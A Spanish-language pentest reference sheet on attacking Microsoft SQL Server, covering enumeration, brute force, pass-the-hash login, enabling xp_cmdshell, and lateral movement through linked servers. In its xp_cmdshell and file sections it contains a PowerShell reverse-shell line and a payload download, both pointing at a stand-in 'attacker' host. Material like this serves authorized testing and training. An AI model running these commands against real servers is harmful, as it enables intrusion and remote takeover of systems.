# MSSQL — Microsoft SQL Server

Microsoft SQL Server es el sistema de gestión de bases de datos de Microsoft, muy común en entornos Windows y aplicaciones .NET. Opera en el puerto **1433** (TCP) por defecto. En entornos con instancias nombradas, usa el puerto **1434** (UDP) para el SQL Server Browser Service, que revela las instancias disponibles.

MSSQL es especialmente interesante en pentests porque tiene funcionalidades integradas que permiten ejecutar comandos del sistema operativo directamente desde consultas SQL.

### Puertos

| Puerto            | Servicio             | Descripción                                            |
| ----------------- | -------------------- | ------------------------------------------------------ |
| `1433` TCP        | MSSQL                | Puerto por defecto de la instancia principal           |
| `1434` UDP        | SQL Server Browser   | Revela instancias disponibles en el servidor           |
| Puertos dinámicos | Instancias nombradas | Las instancias adicionales usan puertos TCP aleatorios |

### Enumeración

#### Nmap

```bash
# Detección básica
nmap -sV -p 1433 target
nmap -sU -p 1434 target              # SQL Server Browser

# Scripts específicos
nmap -sC -sV -p 1433 target
nmap --script ms-sql-info,ms-sql-config,ms-sql-dump-hashes -p 1433 target
nmap --script ms-sql-brute -p 1433 target
nmap --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=contraseña -p 1433 target

# Instancias en la red
nmap --script ms-sql-info -p 1433,1434 -sU -sV target
```

#### impacket-mssqlclient

`mssqlclient.py` de Impacket es la herramienta más usada para conectarse a MSSQL en pentests:

```bash
# Con usuario SQL (autenticación SQL)
impacket-mssqlclient usuario:contraseña@target

# Con autenticación de Windows (Integrated Security)
impacket-mssqlclient DOMINIO/usuario:contraseña@target -windows-auth

# Con hash NTLM (Pass-the-Hash)
impacket-mssqlclient DOMINIO/usuario@target -hashes :NTLM_HASH -windows-auth

# Especificar base de datos
impacket-mssqlclient usuario:contraseña@target -db nombre_db
```

#### Otros clientes

```bash
# sqsh (cliente MSSQL para Linux)
sqsh -S target -U usuario -P contraseña

# Desde Windows: sqlcmd
sqlcmd -S target -U usuario -P contraseña

# Con Metasploit
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target
set USERNAME sa
set PASSWORD contraseña
run
```

### Enumeración dentro de MSSQL

```sql
-- Información del servidor
SELECT @@version;
SELECT @@servername;
SELECT @@servicename;
SELECT SYSTEM_USER;          -- usuario actual de la conexión SQL
SELECT USER_NAME();          -- usuario de la base de datos actual
SELECT IS_SRVROLEMEMBER('sysadmin');    -- ¿el usuario actual es sysadmin?

-- Bases de datos
SELECT name FROM master..sysdatabases;
USE nombre_db;
SELECT name FROM sysobjects WHERE type = 'U';    -- tablas de usuario
SELECT name, colid FROM syscolumns WHERE id = OBJECT_ID('tabla');

-- Usuarios y privilegios
SELECT name, sysadmin FROM master..syslogins;
SELECT name FROM sys.server_principals WHERE type IN ('S', 'U', 'G');
EXEC sp_helplogins;
EXEC sp_helpuser;

-- Configuración del servidor
EXEC sp_configure;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure;    -- ver todas las opciones incluyendo las avanzadas

-- Linked servers (servidores enlazados)
EXEC sp_linkedservers;
SELECT name FROM sys.servers WHERE is_linked = 1;
```

### xp\_cmdshell — ejecución de comandos del sistema

`xp_cmdshell` es un procedimiento almacenado extendido de MSSQL que permite ejecutar comandos del sistema operativo directamente desde una consulta SQL. Es la forma más directa de obtener RCE desde MSSQL.

```sql
-- Ver si xp_cmdshell está activo
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Activar xp_cmdshell (requiere privilegios de sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Ejecutar comandos
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';

-- Reverse shell con PowerShell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\"attacker\",4444);..."';
```

Con `impacket-mssqlclient`, el comando `enable_xp_cmdshell` activa el procedimiento y `xp_cmdshell whoami` lo usa directamente en la shell interactiva.

### Lectura y escritura de archivos

```sql
-- Leer archivos (requiere privilegios)
-- Usando BULK INSERT o OPENROWSET

-- Escribir archivos con xp_cmdshell
EXEC xp_cmdshell 'echo "contenido" > C:\ruta\archivo.txt';
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker/payload.exe -OutFile C:\Windows\Temp\payload.exe"';
```

### Linked Servers — movimiento lateral

Si MSSQL tiene servidores enlazados (_linked servers_), se pueden ejecutar consultas en otros servidores de base de datos usando el contexto de autenticación del enlace:

```sql
-- Ver servidores enlazados
EXEC sp_linkedservers;

-- Ejecutar consulta en servidor enlazado
SELECT * FROM OPENQUERY([servidor_enlazado], 'SELECT @@version');

-- Ejecutar xp_cmdshell en servidor enlazado
EXEC ('xp_cmdshell ''whoami''') AT [servidor_enlazado];
```

### Riesgos y misconfiguraciones

| Riesgo                                                 | Descripción                                                                                              |
| ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
| **xp\_cmdshell activo**                                | Ejecución directa de comandos del sistema operativo → RCE                                                |
| **Usuario SA con contraseña débil**                    | SA es el superadministrador de MSSQL. Brute force con contraseñas comunes.                               |
| **Autenticación SQL habilitada**                       | Si el servidor acepta autenticación SQL además de Windows, el brute force es más sencillo.               |
| **MSSQL corriendo como LocalSystem o NETWORK SERVICE** | Los comandos ejecutados via xp\_cmdshell se ejecutan en ese contexto. LocalSystem = privilegios máximos. |
| **Linked servers con credenciales**                    | Las credenciales almacenadas en linked servers pueden usarse para movimiento lateral.                    |
| **Acceso desde internet**                              | Puerto 1433 expuesto directamente a internet.                                                            |

> Si `xp_cmdshell` está activo y el proceso de SQL Server corre como `NT AUTHORITY\SYSTEM` (LocalSystem), la ejecución de comandos es directamente como SYSTEM — privilegios máximos en el sistema Windows.

> En entornos de Active Directory, el servicio SQL Server suele correr con una **cuenta de servicio de dominio**. Esas credenciales pueden ser Kerberoasteadas y reutilizadas para movimiento lateral si la contraseña es débil.
